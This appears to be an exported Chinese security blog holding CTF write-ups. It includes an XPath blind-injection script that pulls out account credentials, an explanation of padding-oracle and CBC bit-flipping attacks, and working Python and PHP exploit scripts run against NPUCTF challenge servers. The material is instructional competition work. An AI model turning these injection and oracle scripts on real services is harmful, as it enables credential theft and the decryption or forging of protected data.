class="line">    req=sess.post(url+<span class="string">'login.php'</span>,data=data,headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;)</span><br><span class="line">    print(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">"' or  substring(name(/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'accounts'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment">#'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1'='1也可以</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'*'</span>:</span><br><span class="line">            print(<span class="string">'false'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.format(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">'ad'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            print(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后登录进去伪协议大小写绕过就可以得到flag。</p>
<h1 id="0x04-web🐕"><a href="#0x04-web🐕" class="headerlink" title="0x04 web🐕"></a>0x04 web🐕</h1><p><a href="https://mount4in.github.io/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/">看前一篇文章</a></p>
<p>参考：</p>
<p><a href="https://github.com/sqxssss/NPUCTF_WriteUps" target="_blank" rel="noopener">https://github.com/sqxssss/NPUCTF_WriteUps</a></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道ctf题学习cbc-padding-oracle和cbc翻转</title>
    <url>/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/</url>
    <content><![CDATA[<p>之前一直不怎么清楚cbc加密的padding-oracle和cbc翻转攻击方法，这次NPUCTF比赛遇到了，就记录一下吧</p>
<a id="more"></a>

<h1 id="0x01-CBC介绍"><a href="#0x01-CBC介绍" class="headerlink" title="0x01 CBC介绍"></a>0x01 CBC介绍</h1><p>CBC是分组加密的一种模式，常见的分组加密算法有DES、AES等，分组加密首先将明文分成若干固定长度的分组（分组长度视加密算法而定，DES分组长度为八字节、AES分组长度为16字节），然后分别对每组的明文进行加密。</p>
<p>下面引用维基百科对CBC的介绍：</p>
<blockquote>
<p>在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p>
</blockquote>
<p>话说得越多也不如一个图清晰。</p>
<blockquote>
<p>Plaintext：明文</p>
<p>IV：初始化向量</p>
<p>Key：密钥</p>
<p>Ciphertext：密文</p>
</blockquote>
<p>加密图：</p>
<img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/Cbc_encryption.png" alt="Cbc encryption.png" style="zoom:150%;">

<p>解密图：</p>
<img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/Cbc_decryption.png" alt="Cbc decryption.png" style="zoom:150%;">

<ul>
<li>padding-oracle</li>
</ul>
<p>利用场景：密文可控，服务器对解密失败与否有不同的回显</p>
<p>padding-oracle攻击原理是分组密码加密时在对明文进行分组时，采用PKCS#5填充标准，在最后一个分组填充满剩余字节个数对应的字符，如下图所示：</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/9113969-911e905ee20482be.png" alt="图片.png"></p>
<p>如果服务器利用这种加密模式，我们的密码经过CBC加密传输到服务器，服务端在解密密文时，第一步是判断密文最后的一个分组是否正确，是否是采用如上图所示的填充规则，如果填充错误，则直接返回错误；如果正确的话，再将解密后的明文与服务器存储的明文比对，进行下一步的认证。一般会产生三种结果。</p>
<ol>
<li>解密成功并且得到的明文正确，认证成功返回200</li>
<li>可以解密（padding填充正确）但是解密获得的明文不正确，返回200，但认证失败</li>
<li>不可以解密（padding填充失败），返会错误500</li>
</ol>
<p>因为第一、二种和第三种返回的结果不同，所以可以利用这个不同来进行另一种“盲注”，来找到中间值，即下图种红框中的值。</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422123432889.png" alt="image-20200422123432889"></p>
<blockquote>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/15083434757270.png!small" alt="Padding oracle attack详细解析"></p>
</blockquote>
<blockquote>
<p>如上图所示，明文填充了四位时，如果最后一组密文解密后的结果（Intermediary Value也就是中间值）与前一组密文（Initialization Vector也就是IV值）异或得到的最后四位是0×04，那么服务器就会返回可以正常解密。</p>
<p>回忆一下前面我们说过的CBC模式的解密过程，第n组密文解密后的中间值与前一组的密文异或便可得到明文，现在我们不知道解密的密钥key，<strong>但我们知道所有的密文</strong>，因此只要我们能够得到中间值便可以得到正确的密文（进行一次异或运算便可），而中间值是由服务器解密得到的，因此我们虽然不知道怎么解密但我们可以利用服务器帮我们解密，我们所要做的是能确定我们得到的中间值是正确的，这也是padding oracle attack的核心——找出正确的中间值。</p>
<p>下面是攻击步骤</p>
<p>（1）假设我们捕获到了传输的密文并且我们知道是CBC模式采用的什么加密算法，我们把密文按照加密算法的要求分好组，然后对倒数第二组密文进行构造；</p>
<p>（2）先假定明文只填充了一字节，对倒数第二组密文的最后一字节从0×00到0xff逐个赋值并逐个向服务器提交，直到服务返回值表示构造后的密文可以正常解密，这意味着构造后的密文作为中间值（图中黄色的那一行）解密最后一组明文，明文的最后一位是0×01（如图所示），也就是说构造的倒数第二组密文的最后一字节与最后一组密文对应中间值（绿色的那一行）的最后一位相异或的结果是0×01；</p>
<p><a href="https://image.3001.net/images/20171019/15083441758558.png" target="_blank" rel="noopener"><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/15083441758558.png!small" alt="Padding oracle attack详细解析" style="zoom: 200%;"></a></p>
<p>（3）利用异或运算的性质，我们把我们构造的密文的最后一字节与0×01异或便可得到最后一位密文解密后的中间值是什么，这里我们设为M1，这一过程其实就是对应下图CBC解密过程中红圈圈出来的地方，1就是我们想要得到的中间值，2就是我们构造的密文也就是最后一组密文的IV值，我们已经知道了plaintext的最后一字节是0×01，从图中可以看到它是由我们构造的IV值与中间值的最后一字节异或得到的；</p>
<p><a href="https://image.3001.net/images/20171019/15083453084853.png" target="_blank" rel="noopener"><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/15083453084853.png!small" alt="Padding oracle attack详细解析" style="zoom:150%;"></a></p>
<p>（4）再假定明文填充了两字节也就是明文最后两字节是0×02，接着构造倒数第二组密文，我们把M1与0×02异或可以得到填充两字节时密文的最后一位应该是什么，这时候我们只需要对倒数第二位进行不断地赋值尝试（也是从0×00到0xff），当服务器返回值表示可以正常解密时，我们把此时的倒数第二位密文的取值与0×02异或便可得到最后一组密文倒数第二字节对应的中间值；</p>
<p>（5）后再构造出倒数第三倒数第四直到得到最后一组密文的中间值，把这个中间值与截获的密文的倒数第二位异或便可得到最后一组分组的明文；</p>
<p>（6）舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的铭文，最后我们便可以得到全部的明文</p>
</blockquote>
<ul>
<li>CBC翻转</li>
</ul>
<p>利用场景：输入密文可控，而且知道该密文对应的明文。</p>
<p>在贴一下cbc的解密图</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422125141629.png" alt="image-20200422125141629"></p>
<p>在上图解密过程中，会用红圈的字节与第二组密文解密后的中间值异或来得到第二组明文，所以我们就可以通过修改密文来达到准确修改明文的目的，若源明文为old_p，原密文为old_c，我们想将明文修改为tar_p，中间值为inter_v。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inter_v ^ old_c &#x3D; old_p</span><br><span class="line">将old_c &#x3D;&gt; (old_c ^ tar_p ^ old_p)</span><br><span class="line">inter_v ^ (old_c ^ tar_p ^ old_p) &#x3D; old_p ^ tar_p ^old_p &#x3D; tar_p</span><br><span class="line">这样即完成了对明文的伪造。</span><br></pre></td></tr></table></figure>

<h1 id="0x02-NPUCTF-web🐕"><a href="#0x02-NPUCTF-web🐕" class="headerlink" title="0x02 NPUCTF web🐕"></a>0x02 NPUCTF web🐕</h1><p>首先可以得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,********$file1*********</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">真不是注入</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);  <span class="comment">#不返回密文，解密成功返回1，解密失败返回False</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $file1;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码初始化了加密方式为aes-128-cbc、IV 、密钥，然后根据我们输入的method变量，若为encrypt会把$file1加密，若为decrypt会用我们输入的iv作为向量，加密输入的data值。首先可以获取到$file1的加密后的值，</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422131503138.png" alt="image-20200422131503138"></p>
<p>乱码因为源码的编码方式有点问题，这里就不改了。。。。</p>
<p>然后这里的解密功能</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);  <span class="comment">#不返回密文，解密成功返回1，解密失败返回False</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果解密失败的话会返回False，那么就可以利用这点来进行padding oracle了，将那串base64编码解密后得到</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422131849824.png" alt="image-20200422131849824"></p>
<p>正好是十六个字节，可以知道它的明文就只有一个分组，然后就改了改网上的脚本来”盲注“中间值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">"http://ha1cyon-ctf.fun:30006/index.php?source=1&amp;method=decrypt"</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>,<span class="string">"https"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span><span class="params">(iv)</span>:</span></span><br><span class="line">    data=&#123;<span class="string">"iv"</span>:iv,<span class="string">"data"</span>:<span class="string">"ly7auKVQCZWum/W/4osuPA=="</span>&#125;</span><br><span class="line">    result=requests.post(url,data=data,proxies=proxy)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></span><br><span class="line">    get=<span class="string">""</span><span class="comment">#用来存储中间值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))<span class="comment">#成功注出一位后要修改padding</span></span><br><span class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</span><br><span class="line">            <span class="keyword">print</span> c.encode(<span class="string">'hex'</span>)</span><br><span class="line">            result=re(c)</span><br><span class="line">            <span class="keyword">print</span> result.content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"php"</span>  <span class="keyword">in</span> result.content:</span><br><span class="line">                get=chr(j^i)+get</span><br><span class="line">                time.sleep(<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get</span><br><span class="line">mid = padding_oracle(N)</span><br><span class="line"><span class="keyword">print</span> xor(mid,<span class="string">"6666666666666666"</span>)</span><br></pre></td></tr></table></figure>

<p>之后可以得到$file1 为 FlagIsHere.php</p>
<p>然后访问FlagIsHere.php，可以得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//**************$file2********last step!!</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($file2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里也是开始初始化了加密方式 aes-128-cbc、密钥，IV通过get_i()函数获得，默认会把<code>&#39;piapiapiapia&#39;</code>加密，并将密文和IV保存在SESSION中，会打印出IV值，然后可以通过我们输入的iv值作为IV对SESSION中保存的密文进行解密，若解密后为‘weber’，则会输出$file2，这里就可以通过cdc翻转来将明文改变成weber。</p>
<p>下面附上脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$enc = base64_decode(<span class="string">"EjD+vzcXcP9n4iamEmdNMQ=="</span>);</span><br><span class="line">$old = <span class="string">"piapiapiapia"</span> . urldecode(<span class="string">"%04%04%04%04"</span>);</span><br><span class="line">$tar = <span class="string">"weber"</span> . urldecode(<span class="string">"%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">	$enc[$i] = chr(ord($enc[$i]) ^ ord($old[$i]) ^ ord($tar[$i]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($enc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FTz9qix9C50NmUTMHWhCPg==</span></span><br></pre></td></tr></table></figure>

<p>然后将得到的IV传给服务器，服务器会回显</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422135128872.png" alt="image-20200422135128872"></p>
<p>然后访问/HelloWorld.7z可以得到一个java的class文件，放到jd-gui中可以得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] paramArrayOfString)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">");</span></span><br><span class="line"><span class="string">    byte[] arrayOfByte = &#123; </span></span><br><span class="line"><span class="string">        102, 108, 97, 103, 123, 119, 101, 54, 95, 52, </span></span><br><span class="line"><span class="string">        111, 103, 95, 49, 115, 95, 101, 52, 115, 121, </span></span><br><span class="line"><span class="string">        103, 48, 105, 110, 103, 125 &#125;;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后可以看出数组为flag的ascii码，然后解码就可以。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> ]</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	flag += chr(i)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>这里我做题是遇到一个坑点，第一次我是利用下面的脚本生成的IV，提交时发现过不去验证，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$enc = base64_decode(<span class="string">"EjD+vzcXcP9n4iamEmdNMQ=="</span>);</span><br><span class="line">$old = <span class="string">"piapiapiapia"</span>; <span class="comment">//. urldecode("%04%04%04%04");</span></span><br><span class="line">$tar = <span class="string">"weber"</span> . urldecode(<span class="string">"%00%00%00%00%00%00%00"</span>); <span class="comment">//%00%00%00%00");</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">12</span>; $i++) &#123;</span><br><span class="line">	$enc[$i] = chr(ord($enc[$i]) ^ ord($old[$i]) ^ ord($tar[$i]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($enc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">FTz9qix2AJYGkk/HEmdNMQ==</span><br></pre></td></tr></table></figure>

<p>在本地复现发现这样得到的字符串在浏览器显示确实为<code>weber</code>,但是用var_dump()输出一下可以看出</p>
<p><img src="/2020/04/22/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%AD%A6%E4%B9%A0cbc-padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC/image-20200422135611513.png" alt="image-20200422135611513"></p>
<p>这个字符串的长度为12，所以与<code>weber</code>强等于是通过不了的，所以要生成长度为5的<code>weber</code>字符串，所以正确的脚本应该是这样的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$enc = base64_decode(<span class="string">"EjD+vzcXcP9n4iamEmdNMQ=="</span>);</span><br><span class="line">$old = <span class="string">"piapiapiapia"</span> . urldecode(<span class="string">"%04%04%04%04"</span>);</span><br><span class="line">$tar = <span class="string">"weber"</span> . urldecode(<span class="string">"%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b%0b"</span>);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++) &#123;</span><br><span class="line">	$enc[$i] = chr(ord($enc[$i]) ^ ord($old[$i]) ^ ord($tar[$i]));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($enc);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>参考链接</p>
<p><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/151167.html</a></p>
<p><a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/#padding_oracle" target="_blank" rel="noopener"><a href="https://www.smi1e.top/cbc字节翻转攻击和padding-oracle/#padding_oracle" target="_blank" rel="noopener">https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/#padding_oracle</a></a></p>
]]></content>
      <tags>
        <tag>Padding oracle</tag>
        <tag>CBC翻转</tag>
      </tags>
  </entry>
  <entry>
    <title>2020数字中国创新大道虎符网络安全赛道Web题解</title>
    <url>/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>2020数字中国创新大道虎符网络安全赛道Web题解</p>
<a id="more"></a>

<h1 id="0x01-easy-login"><a href="#0x01-easy-login" class="headerlink" title="0x01 easy_login"></a>0x01 easy_login</h1><p>可以扫到源码，看到是Koa框架，然后搜了下框架相关的知识，<a href="https://blog.csdn.net/davidPan1234/article/details/83413958" target="_blank" rel="noopener">看到这篇</a></p>
<p><img src="/2020/04/19/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E9%81%93%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93Web%E9%A2%98%E8%A7%A3/image-20200419192757519.png" alt="image-20200419192757519"></p>
<p>然后访问可以得到源码。</p>
